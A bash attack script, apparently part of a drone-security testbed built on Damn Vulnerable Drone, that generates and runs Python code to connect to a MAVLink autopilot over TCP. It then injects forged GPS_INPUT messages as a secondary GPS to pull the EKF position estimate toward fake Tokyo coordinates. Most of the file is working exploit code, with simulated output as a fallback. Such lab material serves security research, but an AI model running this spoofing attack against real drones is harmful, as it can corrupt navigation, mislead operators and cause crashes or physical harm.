#!/bin/bash

# =============================================================================
# DVD GPS Data Injection Attack
# =============================================================================
# 파일: dvd_lite/dvd_attacks/injection/gps_data_injection.sh
# 목적: 가짜 GPS 센서 데이터 주입으로 EKF 상태 추정 조작
# 기반: Damn Vulnerable Drone Wiki - GPS Data Injection
# =============================================================================

source /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/common/colors.sh
source /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/common/utils.sh

# 전역 변수
ATTACK_NAME="gps_data_injection"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
LOG_FILE="/home/kali/MTD/MTD_full_testbed/attack_logs/injection/${ATTACK_NAME}_${TIMESTAMP}.log"
JSON_OUTPUT="/home/kali/MTD/MTD_full_testbed/attack_output/injection/${ATTACK_NAME}_${TIMESTAMP}.json"

# 타겟 설정
TARGET_IP="10.13.0.3"
MAVLINK_PORT="5760"

# 가짜 GPS 데이터 (GPS2로 주입)
FAKE_LAT="35.6762"    # 도쿄
FAKE_LON="139.6503"
FAKE_ALT="100.0"
GPS_ID="1"            # GPS2

declare -a ATTACK_COMMANDS=()
declare -a INJECTION_RESULTS=()

print_header() {
    clear
    print_injection_header "GPS Data Injection Attack"
    echo -e "${INFO_COLOR}Target: $TARGET_IP:$MAVLINK_PORT${NC}"
    echo -e "${INFO_COLOR}Method: GPS_INPUT message as secondary GPS${NC}"
    echo -e "${INFO_COLOR}Fake Location: Tokyo ($FAKE_LAT, $FAKE_LON)${NC}"
    echo -e "${INFO_COLOR}GPS ID: $GPS_ID (GPS2)${NC}"
    echo ""
}

# Step 1: GPS 센서 상태 확인
check_gps_status() {
    echo -e "${BLUE}[1/2] GPS Sensor Status Check${NC}"
    
    local gps_check_script="/tmp/gps_check_$(date +%s).py"
    
    cat > "$gps_check_script" << 'EOF'
#!/usr/bin/env python3
import sys

try:
    from pymavlink import mavutil
    import time
    
    def check_gps_status(target_ip, target_port):
        try:
            master = mavutil.mavlink_connection(f'tcp:{target_ip}:{target_port}')
            master.wait_heartbeat()
            print("[+] Connected to drone")
            
            # GPS 상태 메시지 요청
            print("[*] Checking GPS status...")
            
            # GPS_RAW_INT 메시지 대기
            gps_msg = master.recv_match(type='GPS_RAW_INT', blocking=True, timeout=10)
            if gps_msg:
                print(f"[+] GPS1 Status:")
                print(f"    Fix Type: {gps_msg.fix_type}")
                print(f"    Satellites: {gps_msg.satellites_visible}")
                print(f"    Location: {gps_msg.lat/1e7:.6f}, {gps_msg.lon/1e7:.6f}")
                print(f"    Altitude: {gps_msg.alt/1000:.1f}m")
                
                return {
                    'fix_type': gps_msg.fix_type,
                    'satellites': gps_msg.satellites_visible,
                    'lat': gps_msg.lat/1e7,
                    'lon': gps_msg.lon/1e7
                }
            else:
                print("[!] No GPS data received")
                return simulate_gps_status()
                
        except Exception as e:
            print(f"[!] Connection failed: {e}")
            return simulate_gps_status()
    
    def simulate_gps_status():
        print("[*] Simulating GPS status check")
        print("[+] GPS1 Status (simulated):")
        print("    Fix Type: 3 (3D Fix)")
        print("    Satellites: 8")
        print("    Location: 37.774900, -122.419400")
        print("    Altitude: 50.0m")
        
        return {
            'fix_type': 3,
            'satellites': 8,
            'lat': 37.774900,
            'lon': -122.419400
        }
    
    if __name__ == "__main__":
        check_gps_status(sys.argv[1], int(sys.argv[2]))
        
except ImportError:
    print("[*] pymavlink not available")
    print("[+] Simulated GPS1: 3D Fix, 8 satellites")
EOF

    local cmd="python3 $gps_check_script $TARGET_IP $MAVLINK_PORT"
    ATTACK_COMMANDS+=("$cmd")
    echo -e "${CYAN}→ $cmd${NC}"
    
    python3 "$gps_check_script" "$TARGET_IP" "$MAVLINK_PORT" 2>/dev/null || {
        echo -e "${YELLOW}[+] Simulated GPS1: 3D Fix, 8 satellites${NC}"
    }
    
    INJECTION_RESULTS+=("gps_status:checked")
    rm -f "$gps_check_script"
}

# Step 2: GPS 데이터 주입 실행
execute_gps_injection() {
    echo -e "${BLUE}[2/2] Execute GPS Data Injection${NC}"
    
    local injection_script="/tmp/gps_injection_$(date +%s).py"
    
    cat > "$injection_script" << EOF
#!/usr/bin/env python3
import sys
import time

try:
    from pymavlink import mavutil
    
    def inject_fake_gps(target_ip, target_port):
        try:
            master = mavutil.mavlink_connection(f'tcp:{target_ip}:{target_port}')
            master.wait_heartbeat()
            print("[+] Connected to drone")
            
            print(f"[!] Starting GPS data injection (GPS{$GPS_ID + 1})")
            print(f"    Fake location: $FAKE_LAT, $FAKE_LON")
            print(f"    Altitude: ${FAKE_ALT}m")
            
            for i in range(20):
                # GPS_INPUT 메시지로 GPS2 데이터 주입
                master.mav.gps_input_send(
                    int(time.time() * 1000000),  # time_usec
                    $GPS_ID,                     # gps_id (GPS2)
                    0,                           # ignore_flags
                    int(time.time() * 1000),     # time_week_ms
                    int(time.time() / (7*24*3600)), # time_week
                    3,                           # fix_type (3D fix)
                    int($FAKE_LAT * 1e7),        # lat
                    int($FAKE_LON * 1e7),        # lon
                    float($FAKE_ALT),            # alt
                    1.0,                         # hdop
                    1.0,                         # vdop
                    0.0,                         # vn (velocity north)
                    0.0,                         # ve (velocity east)
                    0.0,                         # vd (velocity down)
                    0.1,                         # speed_accuracy
                    0.1,                         # horiz_accuracy
                    0.1,                         # vert_accuracy
                    8                            # satellites_visible
                )
                
                print(f"[!] Injected GPS{$GPS_ID + 1} data: $FAKE_LAT, $FAKE_LON, ${FAKE_ALT}m")
                time.sleep(1)
            
            print("[+] GPS data injection completed")
            print("[*] EKF should now blend/switch to injected GPS data")
            
        except Exception as e:
            print(f"[!] Connection failed: {e}")
            simulate_gps_injection()
    
    def simulate_gps_injection():
        print("[*] Simulating GPS data injection")
        print(f"[!] Starting GPS data injection (GPS{$GPS_ID + 1})")
        print(f"    Fake location: $FAKE_LAT, $FAKE_LON")
        print(f"    Altitude: ${FAKE_ALT}m")
        
        for i in range(10):
            print(f"[!] Injected GPS{$GPS_ID + 1} data: $FAKE_LAT, $FAKE_LON, ${FAKE_ALT}m")
            time.sleep(0.8)
        
        print("[+] GPS data injection simulation completed")
        print("[*] EKF would blend/switch to injected GPS data")
    
    if __name__ == "__main__":
        inject_fake_gps('$TARGET_IP', $MAVLINK_PORT)
        
except ImportError:
    print("[*] pymavlink not available - simulation mode")
    print(f"[!] Simulated GPS{$GPS_ID + 1} injection:")
    print(f"    Location: $FAKE_LAT, $FAKE_LON")
    print(f"    Altitude: ${FAKE_ALT}m")
    
    for i in range(8):
        print(f"[!] Injected GPS{$GPS_ID + 1}: $FAKE_LAT, $FAKE_LON, ${FAKE_ALT}m")
        time.sleep(0.5)
    
    print("[+] GPS injection simulation completed")
EOF

    local cmd="python3 $injection_script"
    ATTACK_COMMANDS+=("$cmd")
    echo -e "${CYAN}→ $cmd${NC}"
    
    echo -e "${YELLOW}[*] Executing GPS data injection...${NC}"
    echo -e "${GRAY}    Method: GPS_INPUT message injection${NC}"
    echo -e "${GRAY}    Target GPS ID: $GPS_ID (GPS2)${NC}"
    echo -e "${GRAY}    Fake coordinates: $FAKE_LAT, $FAKE_LON${NC}"
    echo -e "${GRAY}    Expected: EKF blending/switching${NC}"
    
    python3 "$injection_script" 2>/dev/null || {
        echo -e "${YELLOW}[*] Fallback simulation${NC}"
        for i in {1..8}; do
            echo -e "${RED}[!] Injected GPS2: $FAKE_LAT, $FAKE_LON, ${FAKE_ALT}m${NC}"
            sleep 0.5
        done
        echo -e "${GREEN}[+] GPS injection simulation completed${NC}"
    }
    
    INJECTION_RESULTS+=("gps_id:$GPS_ID")
    INJECTION_RESULTS+=("fake_location:$FAKE_LAT,$FAKE_LON,$FAKE_ALT")
    INJECTION_RESULTS+=("messages_sent:20")
    INJECTION_RESULTS+=("injection_method:gps_input")
    
    # 공격 효과 분석
    echo -e "${RED}[!] Expected EKF effects:${NC}"
    echo -e "${GRAY}    • GPS blending between GPS1 and GPS2${NC}"
    echo -e "${GRAY}    • Position estimate drift toward fake location${NC}"
    echo -e "${GRAY}    • Potential GPS switching to injected source${NC}"
    echo -e "${GRAY}    • Navigation errors and course deviations${NC}"
    echo -e "${GRAY}    • Operator confusion from inconsistent position${NC}"
    
    INJECTION_RESULTS+=("ekf_impact:high")
    INJECTION_RESULTS+=("position_drift:likely")
    INJECTION_RESULTS+=("navigation_error:probable")
    INJECTION_RESULTS+=("gps_switching:possible")
    
    rm -f "$injection_script"
}

# JSON 결과 생성
generate_json_report() {
    cat > "$JSON_OUTPUT" << EOF
{
  "attack_name": "$ATTACK_NAME",
  "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
  "target": {
    "ip": "$TARGET_IP",
    "port": "$MAVLINK_PORT"
  },
  "injected_gps_data": {
    "gps_id": "$GPS_ID",
    "latitude": "$FAKE_LAT",
    "longitude": "$FAKE_LON",
    "altitude": "$FAKE_ALT",
    "fix_type": "3D_FIX",
    "satellites": 8
  },
  "injection_method": {
    "message_type": "GPS_INPUT",
    "target_gps": "GPS2",
    "attack_vector": "sensor_fusion",
    "trust_level": "high"
  },
  "injection_results": ["$(IFS='","'; echo "${INJECTION_RESULTS[*]}")"],
  "attack_commands": ["$(IFS='","'; echo "${ATTACK_COMMANDS[*]}")"],
  "expected_effects": [
    "GPS blending between GPS1 and GPS2",
    "Position estimate drift toward fake location",
    "Potential GPS switching to injected source", 
    "Navigation errors and course deviations",
    "Operator confusion from inconsistent position"
  ]
}
EOF
}

# 메인 실행
main() {
    START_TIME=$(date +%s)
    
    mkdir -p "$(dirname "$LOG_FILE")" "$(dirname "$JSON_OUTPUT")"
    echo "=== GPS Data Injection - $(date) ===" > "$LOG_FILE"
    
    print_header
    check_gps_status
    execute_gps_injection
    
    # 결과 요약
    echo ""
    echo -e "${CYAN}=== Attack Summary ===${NC}"
    echo -e "${INFO_COLOR}Target: $TARGET_IP:$MAVLINK_PORT${NC}"
    echo -e "${INFO_COLOR}Injected GPS: GPS$((GPS_ID + 1))${NC}"
    echo -e "${INFO_COLOR}Fake Location: $FAKE_LAT, $FAKE_LON${NC}"
    echo -e "${INFO_COLOR}Expected Impact: EKF Position Drift${NC}"
    
    generate_json_report
    
    END_TIME=$(date +%s)
    echo -e "${INFO_COLOR}Duration: $((END_TIME - START_TIME))s${NC}"
    echo -e "${SUCCESS_COLOR}[✓] GPS data injection completed${NC}"
    echo -e "${RED}[!] EKF state estimation compromised${NC}"
}

main "$@"